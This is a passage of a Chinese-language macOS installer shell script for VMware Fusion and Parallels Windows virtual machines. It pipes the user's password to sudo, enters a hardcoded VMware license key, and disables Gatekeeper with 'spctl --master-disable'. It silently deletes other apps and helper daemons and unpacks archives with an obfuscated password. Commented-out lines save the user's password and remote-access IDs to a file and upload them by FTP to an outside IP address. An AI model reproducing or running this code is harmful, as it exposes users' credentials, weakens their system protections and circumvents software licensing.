    echo .encoding = "UTF-8" > /tmp/config
    echo  >> /tmp/config
    echo fusion.ui.eula.skipPrompt = "TRUE" >> /tmp/config
    echo fusion.ui.registration.skipPrompt = "TRUE" >> /tmp/config
    echo fusion.ui.registration.hideLicense = "TRUE" >> /tmp/config
    echo fusion.ui.dataCollection.skipPrompt = "TRUE" >> /tmp/config
    echo componentDownload.downloadPermission = "deny" >> /tmp/config
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "mkdir -p '/Library/Preferences/VMware Fusion'" password "$pass" with administrator privileges
do shell script "cp /tmp/config '/Library/Preferences/VMware Fusion'" password "$pass" with administrator privileges
do shell script "/Applications/'VMware Fusion Tech Preview'.app/Contents/Library/'Initialize VMware Fusion.tool' set" password "$pass" with administrator privileges
do shell script "/Applications/'VMware Fusion Tech Preview'.app/Contents/Library/licenses/vmware-licenseTool enter ZF3R0-FHED2-M80TY-8QYGC-NPKYF '' '' '12.0' 'VMware Fusion for Mac OS' '' | grep -q '200 License operation succeeded.'" password "$pass" with administrator privileges
EOD
    else 
    echo "$pass" | sudo -S sudo mkdir -p /Library/Preferences/VMware\ Fusion
    echo "$pass" | sudo -S sudo cp /tmp/config /Library/Preferences/VMware\ Fusion
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion\ Tech\ Preview.app/Contents/Library/Initialize\ VMware\ Fusion.tool set
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion\ Tech\ Preview.app/Contents/Library/licenses/vmware-licenseTool \
      enter "ZF3R0-FHED2-M80TY-8QYGC-NPKYF" '' '' '12.0' 'VMware Fusion for Mac OS' '' \
      | grep -q '200 License operation succeeded.'
    fi  
    rm -rf /tmp/config  
    diskutil eject /Volumes/M1VM
    umount -f /Volumes/M1VM
    diskutil eject /Volumes/VMware\ Fusion
    umount -f /Volumes/VMware\ Fusion
    diskutil eject $(diskutil list | grep 'M1VM' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
    diskutil eject $(diskutil list | grep 'VMware Fusion' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
    zhendock=$(defaults read com.apple.dock | grep Preview.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/VMware Fusion Tech Preview.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    open /Applications/VMware\ Fusion\ Tech\ Preview.app
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "open x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo sh -c 'open x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility'
    fi
    #echo "$pass" | tr -d '\n' | pbcopy
    #echo "TBName=$tbid" > /tmp/mac.txt
    #echo "TVName=$TVName" >> /tmp/mac.txt
    #echo "PSName=$pass" >> /tmp/mac.txt
    if [ -f /tmp/mac.txt ]; then
	#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
	echo
	fi
	#rm -rf /tmp/mac.txt
    clear && printf "\e[3J"
    echo
	#echo TeamViewerID: "\033[36m${TVID}\033[0m"
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
    exit 0
    fi    

	if [ "$m1vm11" ]; then
    /tmp/aria2c -c -s25 -x16 -m0 -o 7z18.zip --console-log-level=warn --summary-interval=888888888 $ip5/M17Z.zip -d /tmp
    unzip -o "/tmp/7z18.zip" -d "/tmp">/dev/null 2>&1
    clear && printf "\e[3J"
	echo
	echo ID: "\033[36m${tbid}\033[0m"		
    echo
	echo 正在安装系统，请等待....
	if [ "$azvm11" ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/VMARM11.7z -o/Applications>/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.vmwarevm/虚拟磁盘.vmdk
    rm -rf /Applications/Windows\ 11.vmwarevm/Windows\ 11*
    rm -rf /Applications/Windows\ 11.vmwarevm/vmware*
    rm -rf /Applications/Windows\ 11.vmwarevm/startMenu.plist  
    curl -# -C - --connect-timeout 10 -o /tmp/vmarm11.zip "http://macdos.oss-cn-hangzhou.aliyuncs.com/vmarm11.zip">/dev/null 2>&1
    unzip -o "/tmp/vmarm11.zip" -d "/Applications/Windows 11.vmwarevm">/dev/null 2>&1
    rm -rf /tmp/vmarm11.zip
    fi
    if [ "$azvm10" ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/VMARM10.7z -o/Applications>/dev/null 2>&1
    fi
    hdiutil attach ~/Downloads/JG_Download/VMware-Fusion*.dmg>/dev/null 2>&1
    cp -R /Volumes/VMware\ Fusion/VMware\ Fusion\ Tech\ Preview.app /Applications
    echo >> /tmp/config
    echo .encoding = "UTF-8" > /tmp/config
    echo  >> /tmp/config
    echo fusion.ui.eula.skipPrompt = "TRUE" >> /tmp/config
    echo fusion.ui.registration.skipPrompt = "TRUE" >> /tmp/config
    echo fusion.ui.registration.hideLicense = "TRUE" >> /tmp/config
    echo fusion.ui.dataCollection.skipPrompt = "TRUE" >> /tmp/config
    echo componentDownload.downloadPermission = "deny" >> /tmp/config
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "mkdir -p '/Library/Preferences/VMware Fusion'" password "$pass" with administrator privileges
do shell script "cp /tmp/config '/Library/Preferences/VMware Fusion'" password "$pass" with administrator privileges
do shell script "/Applications/'VMware Fusion Tech Preview'.app/Contents/Library/'Initialize VMware Fusion.tool' set" password "$pass" with administrator privileges
do shell script "/Applications/'VMware Fusion Tech Preview'.app/Contents/Library/licenses/vmware-licenseTool enter ZF3R0-FHED2-M80TY-8QYGC-NPKYF '' '' '12.0' 'VMware Fusion for Mac OS' '' | grep -q '200 License operation succeeded.'" password "$pass" with administrator privileges
EOD
    else 
    echo "$pass" | sudo -S sudo mkdir -p /Library/Preferences/VMware\ Fusion
    echo "$pass" | sudo -S sudo cp /tmp/config /Library/Preferences/VMware\ Fusion
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion\ Tech\ Preview.app/Contents/Library/Initialize\ VMware\ Fusion.tool set
    echo "$pass" | sudo -S sudo /Applications/VMware\ Fusion\ Tech\ Preview.app/Contents/Library/licenses/vmware-licenseTool \
      enter "ZF3R0-FHED2-M80TY-8QYGC-NPKYF" '' '' '12.0' 'VMware Fusion for Mac OS' '' \
      | grep -q '200 License operation succeeded.'
    fi  
    rm -rf /tmp/config
    diskutil eject /Volumes/VMware\ Fusion
    umount -f /Volumes/VMware\ Fusion
    diskutil eject $(diskutil list | grep 'VMware Fusion' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
    zhendock=$(defaults read com.apple.dock | grep Preview.app)
    if [ ! "$zhendock" ]; then
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/Applications/VMware Fusion Tech Preview.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"; killall Dock
    fi
    open /Applications/VMware\ Fusion\ Tech\ Preview.app
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "open x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo sh -c 'open x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility'
    fi
    #echo "$pass" | tr -d '\n' | pbcopy
    #echo "TBName=$tbid" > /tmp/mac.txt
    #echo "TVName=$TVName" >> /tmp/mac.txt
    #echo "PSName=$pass" >> /tmp/mac.txt
    if [ -f /tmp/mac.txt ]; then
	#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
	echo
	fi
	#rm -rf /tmp/mac.txt
    clear && printf "\e[3J"
    echo
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
    exit 0   
    
    fi
     
    if [ "$pd107z" ]; then 
    if [ "$M1Yes" ]; then
    /tmp/aria2c -c -s25 -x16 -m0 -o 7z18.zip --console-log-level=warn --summary-interval=888888888 $ip5/M17Z.zip -d /tmp
    else
    if [ "$pddbb" ]; then
    /tmp/aria2c -c -s25 -x16 -m0 -o 7z18.zip --console-log-level=warn --summary-interval=888888888 $ip5/7z9.zip -d /tmp
    else
    /tmp/aria2c -c -s25 -x16 -m0 -o 7z18.zip --console-log-level=warn --summary-interval=888888888 $ip5/7z18.zip -d /tmp
    fi
    fi
    unzip -o "/tmp/7z18.zip" -d "/tmp">/dev/null 2>&1 	
    if [ ! -f /tmp/7z ]; then
    clear && printf "\e[3J"
    echo
    echo
    if [ "$M1Yes" ]; then
    /tmp/aria2c -c -s25 -x16 -m0 -o 7z18.zip --console-log-level=warn --summary-interval=888888888 $osip/M17Z.zip -d /tmp
    else
    if [ "$pddbb" ]; then
    /tmp/aria2c -c -s25 -x16 -m0 -o 7z18.zip --console-log-level=warn --summary-interval=888888888 $osip/7z9.zip -d /tmp
    else
    /tmp/aria2c -c -s25 -x16 -m0 -o 7z18.zip --console-log-level=warn --summary-interval=888888888 $osip/7z18.zip -d /tmp
    fi
    fi
    if [ ! -f /tmp/7z ]; then
    clear && printf "\e[3J"
    echo
    echo
    read -s -n1 -p "解压工具无法下载，请任意键重试！！！"
    M1Arm
    fi
    fi
 	rm -rf ~/Downloads/JG_Download/ParallelsDesktop-*.1.dmg >/dev/null 2>&1
	rm -rf ~/Downloads/JG_Download/ParallelsDesktop-*.2.dmg >/dev/null 2>&1
	rm -rf ~/Downloads/JG_Download/ParallelsDesktop-*.3.dmg >/dev/null 2>&1
 	clear
	echo
	echo ID: "\033[36m${tbid}\033[0m"		
    echo
	echo 正在安装系统，请等待....
	if [ ! "$zazxtt" ]; then
	killall PD\ Runner 2>/dev/null
	killall PD\ Partner 2>/dev/null
	killall PD_START 2>/dev/null
	killall prl_client_app >/dev/null 2>&1 	
	fi
	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "spctl --master-disable" password "$pass" with administrator privileges
EOD
    else
	echo "$pass" | sudo -S sudo spctl --master-disable >/dev/null 2>&1	
	fi
	if [ ! "$zazxtt" ]; then
	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "rm -rf '/Applications/Parallels Desktop.app'" password "$pass" with administrator privileges
EOD
    else	
	echo "$pass" | sudo -S sudo rm -rf /Applications/Parallels\ Desktop.app >/dev/null 2>&1 
	fi
	if [ "$scpdk" ]; then
	if [ -e $HOME/Parallels ]; then
	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "mv -f $HOME/Parallels ~/.Trash" password "$pass" with administrator privileges
do shell script "mv -f $HOME/Desktop/*.lnk ~/.Trash" password "$pass" with administrator privileges
EOD
    else
	echo "$pass" | sudo -S sudo mv -f $HOME/Parallels ~/.Trash >/dev/null 2>&1
	echo "$pass" | sudo -S sudo mv -f $HOME/Desktop/*.lnk ~/.Trash >/dev/null 2>&1
	fi
	fi
	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "mv -f /Applications/*.pvm ~/.Trash" password "$pass" with administrator privileges
do shell script "mv -f $HOME/Desktop/'Windows 11' ~/.Trash" password "$pass" with administrator privileges
do shell script "mv -f $HOME/Desktop/'Windows 10' ~/.Trash" password "$pass" with administrator privileges
do shell script "mv -f $HOME/Desktop/'Windows 7' ~/.Trash" password "$pass" with administrator privileges
do shell script "rm -rf /Library/Preferences/Parallels/vmdirectorylist.desktop.xml" password "$pass" with administrator privileges
EOD
    else
	echo "$pass" | sudo -S sudo mv -f /Applications/*.pvm ~/.Trash >/dev/null 2>&1 	
	echo "$pass" | sudo -S sudo mv -f $HOME/Desktop/Windows\ 11 ~/.Trash >/dev/null 2>&1 	
	echo "$pass" | sudo -S sudo mv -f $HOME/Desktop/Windows\ 10 ~/.Trash >/dev/null 2>&1 	
	echo "$pass" | sudo -S sudo mv -f $HOME/Desktop/Windows\ 7 ~/.Trash >/dev/null 2>&1 	
    echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/Parallels/vmdirectorylist.desktop.xml >/dev/null 2>&1	
	#﻿echo "$pass" | sudo -S sudo mv -f $HOME/Applications\ \(Parallels\) ~/.Trash 2>/dev/null
	#﻿echo "$pass" | sudo -S sudo mv -f $HOME/Applications/Windows\ 10\ Applications.app 2>/dev/null
	fi	
	fi
	killall PD\ Runner 2>/dev/null	
	killall PD\ Partner 2>/dev/null
	if [ -f /Library/Preferences/Parallels/network.desktop.xml ]; then
	czxnj="1"
	awl=`cat /Library/Preferences/Parallels/network.desktop.xml|grep UseKextless | sed 's/ //g'`
	bwl="<UseKextless>0</UseKextless>"
	ausb=`cat /Library/Preferences/Parallels/dispatcher.desktop.xml |grep Usb\>| sed 's/ //g'`
	busb="<Usb>1</Usb>"
	if [ "$awl" = "$bwl" ]; then
	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "rm -rf /Library/Preferences/Parallels/network.desktop.xml" password "$pass" with administrator privileges	
EOD
	else
	echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/Parallels/network.desktop.xml >/dev/null 2>&1
	fi
	fi
	if [ "$ausb" = "$busb" ]; then
	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "rm -rf /Library/Preferences/Parallels/dispatcher.desktop.xml" password "$pass" with administrator privileges
EOD
	else	
	echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/Parallels/dispatcher.desktop.xml >/dev/null 2>&1
	fi
	fi
	fi
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
do shell script "rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist" password "$pass" with administrator privileges
do shell script "rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/启动Win系统.app" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/PD Runner.app'" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/PD Partner.app'" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/Go.app" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/PDST.app" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/PD 启动.app'" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/启动虚拟机.app" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/打开Win10.prlnk" password "$pass" with administrator privileges
do shell script "rm -rf /Applications/打开Win11.prlnk" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/Windows 10.app'" password "$pass" with administrator privileges
do shell script "rm -rf '/Applications/Windows 7.app'" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo launchctl unload /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/LaunchDaemons/com.lihaoyun6.PD-Runner-Helper.plist >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Library/PrivilegedHelperTools/com.lihaoyun6.PD-Runner-Helper >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动Win系统.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Runner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ Partner.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Go.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/PDST.app >/dev/null 2>&1	
	echo "$pass" | sudo -S sudo rm -rf /Applications/PD\ 启动.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/启动虚拟机.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win10.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/打开Win11.prlnk >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 10.app >/dev/null 2>&1
	echo "$pass" | sudo -S sudo rm -rf /Applications/Windows\ 7.app >/dev/null 2>&1
    fi
    fi
	if [ "$azw11" ]; then
	if [ -f ~/Downloads/JG_Download/Win11.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/Win11.7z -o/Applications>/dev/null 2>&1
    #curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/Mbox.exe "$ip5/Mbox.exe">/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/16Win11.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/16Win11.7z -o/Applications>/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/628ARM11.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/628ARM11.7z -o/Applications>/dev/null 2>&1
    #curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/Mbox.exe "$ip5/Mbox.exe">/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/903ARM11.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/903ARM11.7z -o/Applications>/dev/null 2>&1
    fi  
    if [ -f ~/Downloads/JG_Download/A111212.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/A111212.7z -o/Applications>/dev/null 2>&1
    fi  
    if [ "$xnnew10" ]; then
    if [ -f ~/Downloads/JG_Download/823ARM11.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/823ARM11.7z -o/Applications>/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/1113ARM11.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/1113ARM11.7z -o/Applications>/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/1122H2.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/1122H2.7z -o/Applications>/dev/null 2>&1
    fi
    fi 
    fi
    if [ "$azw10" ]; then
	if [ -f ~/Downloads/JG_Download/Win10.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/Win10.7z -o/Applications>/dev/null 2>&1
    #curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/Mbox.exe "$ip5/Mbox.exe">/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/17Win10.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/17Win10.7z -o/Applications>/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/14Win10_911.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/14Win10_911.7z -o/Applications>/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/16Win10.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/16Win10.7z -o/Applications>/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/14Win10.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/14Win10.7z -o/Applications>/dev/null 2>&1
    #curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/Mbox.exe "$ip5/Mbox.exe">/dev/null 2>&1
    fi       
    if [ -f ~/Downloads/JG_Download/628ARM10.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/628ARM10.7z -o/Applications>/dev/null 2>&1
    curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/qx.reg "$ip5/qx.reg">/dev/null 2>&1
    fi
    if [ "$xnnew10" ]; then
    if [ -f ~/Downloads/JG_Download/823ARM10.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/823ARM10.7z -o/Applications>/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/1113ARM10.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/1113ARM10.7z -o/Applications>/dev/null 2>&1
    fi
    fi
    fi
    if [ "$azw7" ]; then
	if [ -f ~/Downloads/JG_Download/Win7.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/Win7.7z -o/Applications>/dev/null 2>&1
    #curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/Mbox.exe "$ip5/Mbox.exe">/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/16Win7.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/16Win7.7z -o/Applications>/dev/null 2>&1
    fi  
    if [ -f ~/Downloads/JG_Download/14Win7.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/14Win7.7z -o/Applications>/dev/null 2>&1
    #curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/Mbox.exe "$ip5/Mbox.exe">/dev/null 2>&1
    fi 
    if [ -f ~/Downloads/JG_Download/14Win7_911.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/14Win7_911.7z -o/Applications>/dev/null 2>&1
    fi
    if [ -f ~/Downloads/JG_Download/16Win7_911.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/16Win7_911.7z -o/Applications>/dev/null 2>&1
    fi
    fi
	if [ -f ~/Downloads/JG_Download/v10.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/v10.7z -o/Applications>/dev/null 2>&1
    #curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/Mbox.exe "$ip5/Mbox.exe">/dev/null 2>&1
    if [ "$vvm19" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 10 x64.vmx" "$ip5/1019.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10\ x64.vmwarevm/Windows\ 10\ x64.vmx
    cp "/tmp/Windows 10 x64.vmx" /Applications/Windows\ 10\ x64.vmwarevm
    fi
    if [ "$vvm16" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 10 x64.vmx" "$ip5/1016.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10\ x64.vmwarevm/Windows\ 10\ x64.vmx
    cp "/tmp/Windows 10 x64.vmx" /Applications/Windows\ 10\ x64.vmwarevm
    fi
    if [ "$vvm14" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 10 x64.vmx" "$ip5/1014.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10\ x64.vmwarevm/Windows\ 10\ x64.vmx
    cp "/tmp/Windows 10 x64.vmx" /Applications/Windows\ 10\ x64.vmwarevm
    fi 
    if [ "$vvm12" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 10 x64.vmx" "$ip5/1012.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10\ x64.vmwarevm/Windows\ 10\ x64.vmx
    cp "/tmp/Windows 10 x64.vmx" /Applications/Windows\ 10\ x64.vmwarevm
    fi  
    fi
    
	if [ -f ~/Downloads/JG_Download/911v10.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/911v10.7z -o/Applications>/dev/null 2>&1
    if [ "$vvm20" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 10 x64.vmx" "$ip5/v1020.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10\ x64.vmwarevm/Windows\ 10\ x64.vmx
    cp "/tmp/Windows 10 x64.vmx" /Applications/Windows\ 10\ x64.vmwarevm
    fi
    if [ "$vvm16" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 10 x64.vmx" "$ip5/v1016.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10\ x64.vmwarevm/Windows\ 10\ x64.vmx
    cp "/tmp/Windows 10 x64.vmx" /Applications/Windows\ 10\ x64.vmwarevm
    fi
    if [ "$vvm14" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 10 x64.vmx" "$ip5/v1014.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10\ x64.vmwarevm/Windows\ 10\ x64.vmx
    cp "/tmp/Windows 10 x64.vmx" /Applications/Windows\ 10\ x64.vmwarevm
    fi 
    if [ "$vvm12" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 10 x64.vmx" "$ip5/v1012.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10\ x64.vmwarevm/Windows\ 10\ x64.vmx
    cp "/tmp/Windows 10 x64.vmx" /Applications/Windows\ 10\ x64.vmwarevm
    fi  
    fi
	if [ -f ~/Downloads/JG_Download/911v7.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/911v7.7z -o/Applications>/dev/null 2>&1
    if [ "$vvm20" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 7 x64.vmx" "$ip5/v720.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64.vmx
    cp "/tmp/Windows 7 x64.vmx" /Applications/Windows\ 7\ x64.vmwarevm
    fi   
    if [ "$vvm16" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 7 x64.vmx" "$ip5/v716.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64.vmx
    cp "/tmp/Windows 7 x64.vmx" /Applications/Windows\ 7\ x64.vmwarevm
    fi   
    if [ "$vvm14" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 7 x64.vmx" "$ip5/v714.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64.vmx
    cp "/tmp/Windows 7 x64.vmx" /Applications/Windows\ 7\ x64.vmwarevm
    fi 
    if [ "$vvm12" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 7 x64.vmx" "$ip5/v712.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64.vmx
    cp "/tmp/Windows 7 x64.vmx" /Applications/Windows\ 7\ x64.vmwarevm
    fi 
    fi
            
